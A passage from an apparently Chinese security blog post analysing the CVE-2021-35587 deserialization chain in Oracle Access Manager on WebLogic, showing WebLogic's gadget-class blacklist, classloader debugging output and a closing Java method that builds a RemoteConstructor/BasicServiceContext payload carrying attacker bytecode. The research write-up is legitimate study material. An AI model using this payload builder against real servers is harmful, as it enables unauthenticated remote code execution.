</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714144823617.png alt=image-20220714144823617></p><p>于是成功获取到类</p><p><img loading=lazy src=image-20220714143232448.png alt=image-20220714143232448></p><p>weblogic环境中完成resolve以后，还会进入 filterCheck黑名单校验</p><p><img loading=lazy src=image-20220714160408957.png alt=image-20220714160408957></p><p><img loading=lazy src=image-20220714114515979.png alt=image-20220714114515979></p><p>黑名单列表如下</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-23>23</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aop</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aspectj</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aop</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aspectj</span><span style=color:#f92672>.</span><span style=color:#a6e22e>annotation</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aop</span><span style=color:#f92672>.</span><span style=color:#a6e22e>aspectj</span><span style=color:#f92672>.</span><span style=color:#a6e22e>autoproxy</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>beans</span><span style=color:#f92672>.</span><span style=color:#a6e22e>factory</span><span style=color:#f92672>.</span><span style=color:#a6e22e>support</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>bea</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>repackaged</span><span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transaction</span><span style=color:#f92672>.</span><span style=color:#a6e22e>support</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AbstractPlatformTransactionManager</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>sun</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xalan</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xsltc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>trax</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>activation</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RemoteObject</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RemoteObjectInvocationHandler</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.</span><span style=color:#a6e22e>UnicastRemoteObject</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>javassist<span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>commons</span><span style=color:#f92672>.</span><span style=color:#a6e22e>collections</span><span style=color:#f92672>.</span><span style=color:#a6e22e>functors</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>codehaus</span><span style=color:#f92672>.</span><span style=color:#a6e22e>groovy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ConversionHandler</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>codehaus</span><span style=color:#f92672>.</span><span style=color:#a6e22e>groovy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ConvertedClosure</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>codehaus</span><span style=color:#f92672>.</span><span style=color:#a6e22e>groovy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>runtime</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MethodClosure</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>builder</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>proxy</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reader</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>spi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>metadata</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>jboss</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>spi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>model</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>python</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>org<span style=color:#f92672>.</span><span style=color:#a6e22e>springframework</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transaction</span><span style=color:#f92672>.</span><span style=color:#a6e22e>support</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AbstractPlatformTransactionManager</span>
</span></span><span style=display:flex><span><span style=color:#f92672>!</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>server</span><span style=color:#f92672>.*</span>
</span></span></code></pre></td></tr></table></div></div><p>显然 <code>com.tangosol.internal.util.invoke.RemoteConstructor</code> 不在其中。</p><p>而OAM环境下的ClassLoader是weblogic.utils.classloaders.GenericClassLoader，其中加载了2314个类</p><p><img loading=lazy src=image-20220714142331001.png alt=image-20220714142331001></p><p>并且其中有一个classPatterns列表</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-66-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-66-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>0 = {Pattern@37540} &#34;^org.apache.commons.logging.{0,1}&#34;
</span></span><span style=display:flex><span>1 = {Pattern@37541} &#34;^oracle.security.am.{0,1}&#34;
</span></span><span style=display:flex><span>2 = {Pattern@37542} &#34;^com.tangosol.{0,1}&#34;
</span></span><span style=display:flex><span>3 = {Pattern@37543} &#34;^org.eclipse.higgins.configuration.{0,1}&#34;
</span></span><span style=display:flex><span>4 = {Pattern@37544} &#34;^org.python.{0,1}&#34;
</span></span></code></pre></td></tr></table></div></div><p>这个classPatterns用来判断是否委派给双亲</p><p><img loading=lazy src=image-20220714143622321.png alt=image-20220714143622321></p><p>但classLoader中还是有不少这样pattern的类的</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-67-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-67-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Iterator iterator<span style=color:#f92672>=</span>latestUserDefinedLoader<span style=color:#f92672>().</span><span style=color:#a6e22e>classes</span><span style=color:#f92672>.</span><span style=color:#a6e22e>iterator</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> res<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;();</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>    String item<span style=color:#f92672>=</span> iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class org.apache.commons.logging&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class oracle.security.am&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class com.tangosol&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class org.eclipse.higgins.configuration&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>            item<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class org.python&#34;</span><span style=color:#f92672>)){</span>
</span></span><span style=display:flex><span>        res<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>res
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714150815941.png alt=image-20220714150815941></p><p>OAM中没有获取到类，并且抛出了异常</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-68-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-68-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ClassNotFoundException</span><span style=color:#f92672>:</span> com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RemoteConstructor</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714143749207.png alt=image-20220714143749207></p><p><code>class com.tangosol.internal.util.invoke.RemoteConstructor</code> 也确实不在其中</p><p><img loading=lazy src=image-20220714144924938.png alt=image-20220714144924938></p><h3 id=延长gadget>延长gadget<a hidden class=anchor aria-hidden=true href=#延长gadget>#</a></h3><p>参考网上资料发现类 <code>weblogic.rmi.provider.BasicServiceContext</code> 有一个属性是object类型</p><p><img loading=lazy src=image-20220714163101595.png alt=image-20220714163101595></p><p>延长利用链到这个类即可</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-69-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-69-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2021_35587</span><span style=color:#f92672>(</span>Class poccls<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>poccls<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
